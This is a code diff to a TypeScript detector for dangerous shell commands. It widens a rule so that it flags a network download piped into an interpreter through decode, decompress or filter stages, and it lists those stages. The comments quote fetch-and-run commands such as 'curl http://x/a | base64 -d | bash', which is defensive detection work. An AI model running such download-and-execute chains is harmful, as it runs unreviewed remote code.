@@ -36,7 +36,7 @@
  * match.
  */
 
-import { splitShellCommands, tokenizeShell } from "./shell-tokens.ts";
+import { splitShellCommands, splitShellSegments, tokenizeShell } from "./shell-tokens.ts";
 
 /** Whose command semantics to read the line with. */
 export type DangerousCommandPlatform = "posix" | "windows";
@@ -3069,7 +3069,93 @@ function segmentProgram(segment: string, platform: DangerousCommandPlatform = "p
 }
 
 /**
- * A download piped straight into an interpreter.
+ * Programs that hand on whatever they read on their input.
+ *
+ * A whitelist, and it has to be one: there is no way to tell from a command
+ * line whether an arbitrary program forwards its standard input, so a rule that
+ * walked "every stage in between" would be walking on an assumption, and
+ * `curl … | some-binary | bash` would prompt on a guess. Naming the stages is
+ * the honest version — each entry below is a program that emits a stream built
+ * from the stream it read, so bytes fetched from the network still reach the
+ * interpreter after passing through it.
+ *
+ * Nothing here was executed on this machine, which has no POSIX userland to
+ * execute them in. They are named from what each one does, the same basis as the
+ * `wmic` entry elsewhere in this file: not being runnable here is a fact about
+ * this machine rather than a reason to leave the act uncovered.
+ *
+ * Grouped by what they do to the bytes, because that grouping is the reason a
+ * given name is here and it is worth being able to check a name against it:
+ *
+ * - pass-through: `cat` and `tee` emit the input unchanged, so a chain through
+ *   them is the same chain without them;
+ * - decode: the base64, hex, uuencode and OpenSSL spellings, which turn bytes
+ *   into the *program text* an interpreter wants. This is the group the rule is
+ *   really about — it is the step that turns a download nobody can read into one
+ *   that looks like anything at all;
+ * - decompress: the gzip/bzip2/xz/lzma/zstd/uncompress families and their
+ *   decompressing spellings, which reach the same place by a different door;
+ * - mangle and filter: line and character transforms. These obscure the payload
+ *   without decoding it, and they are the ones that also appear in ordinary
+ *   pipelines, so each name here is a program that still emits a stream.
+ */
+const PIPE_FORWARDING_PROGRAMS = new Set([
+	// Pass-through.
+	"cat",
+	"tee",
+	// Decode.
+	"base64",
+	"openssl",
+	"uudecode",
+	"xxd",
+	"iconv",
+	// Decompress.
+	"bzip2",
+	"bunzip2",
+	"bzcat",
+	"compress",
+	"gzip",
+	"gunzip",
+	"lzcat",
+	"lzma",
+	"pigz",
+	"uncompress",
+	"unxz",
+	"xz",
+	"xzcat",
+	"zcat",
+	"zlib-flate",
+	"zstd",
+	"zstdcat",
+	"unzstd",
+	// Mangle and filter.
+	"awk",
+	"column",
+	"cut",
+	"dos2unix",
+	"egrep",
+	"expand",
+	"fold",
+	"fgrep",
+	"gawk",
+	"grep",
+	"head",
+	"jq",
+	"less",
+	"more",
+	"nl",
+	"rev",
+	"sed",
+	"sort",
+	"strings",
+	"tail",
+	"tr",
+	"uniq",
+	"yq",
+]);
+
+/**
+ * A download piped into an interpreter, with stages in between.
  *
  * This one is about the pipe rather than about either end: neither `curl` nor
  * `sh` is dangerous on its own, and a rule for each of them separately would be
@@ -3078,20 +3164,59 @@ function segmentProgram(segment: string, platform: DangerousCommandPlatform = "p
  * the repository that can read it — and the interpreter will run it before any
  * file is written where a user could look at it.
  *
+ * **The chain, not the pair.** This used to ask only about two *adjacent*
+ * segments, and that made the rule trivially evadable by putting one stage in
+ * between: `curl http://x/a | base64 -d | bash` answered `null` while
+ * `curl http://x/a | bash` matched. The decoder hop is not a weaker version of
+ * the attack — it is the version that produces bytes no one can read even by
+ * looking at the download. So the walk starts at a fetcher, steps over any
+ * number of {@link PIPE_FORWARDING_PROGRAMS}, and reports the first interpreter
+ * it lands on.
+ *
+ * **Only `|` continues the chain.** This is the reason the walk needs the
+ * separators rather than the segments: `curl … ; base64 -d ; bash` runs three
+ * unrelated commands and moves no bytes between them, and treating it as a
+ * chain would be a rule firing on the wrong thing. `&&`, `||`, `;`, `&` and a
+ * newline all end the walk, and so does any stage not named above.
+ *
+ * **Redirections are not modelled, and the sentence an earlier version of this
+ * comment wrote about them was false.** It claimed a stage that redirects ends
+ * the walk, on the reasoning that `curl … | base64 -d > /tmp/x` sends nothing
+ * to a later command. The walk reads operators and program names only, so it
+ * does not: `curl … | base64 -d > /tmp/x | bash` matches, and in that command
+ * `bash` reads an empty pipe and cannot run anything. Leaving it is deliberate.
+ * Deciding it properly means telling "still writes its stdout" from "sends it
+ * to a file" apart — `tee f` writes both, `> f` writes only the file, `2>` is
+ * not stdout at all — and the only shape where the answer changes the match is
+ * a pipeline that cannot execute anything, which is a false positive nobody
+ * types. The shape that *is* worth a rule has no pipe in it and is not this
+ * one: `curl -o /tmp/x ; bash /tmp/x` downloads to a file and then runs it, and
+ * no amount of walking a pipeline chain will ever see that.
+ *
  * Measured on this machine: `cat payload.sh | sh` and `| bash` both ran the
  * script, and so did piping into each interpreter named above.
  */
-function fetchPipedIntoInterpreter(segments: string[]): DangerousCommandMatch | null {
-	for (let i = 0; i + 1 < segments.length; i++) {
-		const left = segmentProgram(segments[i]);
-		const right = segmentProgram(segments[i + 1]);
-		if (left === undefined || right === undefined) continue;
-		if (!NETWORK_FETCH_PROGRAMS.has(left)) continue;
-		if (!SCRIPT_INTERPRETERS.has(right)) continue;
-		return {
-			kind: "Other",
-			rule: `\`${left}\` piped into \`${right}\`, which runs a script nobody has read`,
-		};
+function fetchPipedIntoInterpreter(script: string): DangerousCommandMatch | null {
+	const segments = splitShellSegments(script);
+	for (let i = 0; i < segments.length; i++) {
+		const fetcher = segmentProgram(segments[i].text);
+		if (fetcher === undefined || !NETWORK_FETCH_PROGRAMS.has(fetcher)) continue;
+		const forwarded: string[] = [];
+		for (let j = i + 1; j < segments.length; j++) {
+			if (segments[j - 1].separator !== "|") break;
+			const stage = segmentProgram(segments[j].text);
+			if (stage === undefined) break;
+			if (SCRIPT_INTERPRETERS.has(stage)) {
+				const through =
+					forwarded.length === 0 ? "" : ` through ${forwarded.map((name) => `\`${name}\``).join(" then ")}`;
+				return {
+					kind: "Other",
+					rule: `\`${fetcher}\` piped into \`${stage}\`${through}, which runs a script nobody has read`,
+				};
+			}
+			if (!PIPE_FORWARDING_PROGRAMS.has(stage)) break;
+			forwarded.push(stage);
+		}
 	}
 	return null;
 }
@@ -3985,7 +4110,7 @@ function matchScript(script: string, depth: number, platform: DangerousCommandPl
 				if (history) return history;
 			}
 		}
-		const piped = fetchPipedIntoInterpreter(segments);
+		const piped = fetchPipedIntoInterpreter(script);
 		if (piped) return piped;
 	}
 	// `;` is a CMD switch separator and a command separator on every other platform,
